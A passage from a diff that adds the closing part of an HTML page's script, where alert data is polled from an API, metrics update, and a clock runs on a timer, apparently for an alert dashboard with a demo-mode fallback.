+    if(!r.ok) return;
+    const data = await r.json();
+    if(data.length && data.length !== alerts.filter(a=>!a._demo).length){
+      alerts = data.map(a=>({...a, _id:a.alert_id||uid(), _ts:(a.timestamp||'').slice(11,19)||ts(), _new:false}));
+      updateMetrics();
+      render();
+    }
+  } catch(e){ /* API not available — demo mode only */ }
+}
+
+/* ── Boot ── */
+setInterval(updateClock, 1000);
+setInterval(fetchFromAPI, 10000);
+updateClock();
+updateMetrics();
+render();
+</script>
+</body>
+</html>
